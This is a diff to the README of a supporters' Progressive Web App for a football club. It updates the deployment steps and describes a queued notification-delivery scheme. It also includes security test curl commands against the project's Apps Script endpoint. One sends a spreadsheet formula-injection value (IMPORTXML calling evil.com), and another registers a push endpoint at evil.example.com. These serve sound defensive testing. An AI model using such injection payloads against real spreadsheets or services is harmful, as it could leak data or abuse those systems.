@@ -21,7 +21,8 @@ Official open-source Progressive Web App (PWA) for supporters of **Chabab Baladi
 |  • Header-based table parser & explicit penalty model             |
 |  • Match state machine (scheduled/live/finished/postponed/forfeit)|
 |  • Sanity checks + JSON Schema validation (data/schema.json)      |
-|  • Pre-persisted notification dedupe + parallel Web Push (10x)    |
+|  • Notification QUEUE in status.json, delivered after the push    |
+|  • Parallel Web Push (10 workers), per-channel sent markers      |
 +-------------------------------------------------------------------+
         |                                         |
         | git commit & push (cbm-bot)             | POST (ADMIN_KEY / VAPID)
@@ -125,7 +126,7 @@ git commit -m "chore(repo): remove stray root data.json, workflow copies, and zi
 git push
 ```
 
-### 2. Google Apps Script Deployment (`Code.gs` v3.2)
+### 2. Google Apps Script Deployment (`Code.gs` v8 — compatible with the existing sheet layout, no data migration)
 1. Open your Google Sheet → **Extensions → Apps Script**.
 2. Replace the contents of `Code.gs` with the updated `Code.gs` file from this repository and click **Save (💾)**.
 3. Click **Project Settings (⚙️)** on the left sidebar → scroll to **Script Properties** → ensure property `ADMIN_KEY` is set to a strong secret string.
@@ -146,7 +147,7 @@ Replace `EXEC_URL` with your Google Apps Script `/exec` URL:
 ```bash
 EXEC_URL="https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec"
 
-# 1) Formula injection attempt -> stored safely with leading apostrophe ('=IMPORTXML...)
+# 1) Formula injection attempt -> leading = + - @ characters are stripped from the stored name
 curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
   -d '{"v":2,"a":"register","name":"=IMPORTXML(\"https://evil.com\",\"//a\")","dev":"dev-test-1","lang":"ar"}'
 
@@ -154,7 +155,7 @@ curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
 curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
   -d '{"v":2,"a":"push_sub","dev":"dev-test-1","sub":{"endpoint":"https://evil.example.com/push","keys":{"p256dh":"BOr...","auth":"xyz..."}}}'
 
-# 3) Family member registering a second card with a different name on the same phone -> succeeds!
+# 3) Family member registering a second card with a different name on the same phone -> succeeds (max 3 new cards / 15 min per device)
 curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
   -d '{"v":2,"a":"register","name":"بلعريبي سعيد","dev":"family-phone-1","lang":"ar"}'
 curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
@@ -167,7 +168,20 @@ for i in 1 2 3 4 5 6; do
   echo ""
 done
 
-# 5) Public verify lookup -> read-only, returns maskedName, rate-limited at 30 req / 15m per dev
+# 5) Public verify lookup -> read-only, returns maskedName; limited to 60 req / 15 min per dev (requests without dev: global ceiling of 1500 only)
 curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
   -d '{"v":2,"a":"verify","supporterId":"CBM-123456","dev":"scanner-dev-1"}'
 ```
+
+## Notification Delivery (exactly-once-ish)
+
+1. `python scraper.py --verbose --defer-notifications` updates `data/data.json` and only **queues** events in `data/status.json` (`queuedNotifications`).
+2. The workflow commits and pushes both files.
+3. `python scraper.py --notify-queued` sends Telegram + Web Push **after** the push succeeded, using per-channel `sent` markers, then clears the queue (an event is retried at most 3 times).
+4. A final small commit stores the delivery state, so the next run never re-sends the same event.
+
+If step 2 fails, nothing was sent and the next run simply re-detects the change. Running `python scraper.py` without flags still sends immediately (local use).
+
+## Styling
+
+`style-additions.css` contains only the new rules (sync bar, status badges, noscript banner; dark + light). Append it to the end of your existing `style.css`; do not replace the file.
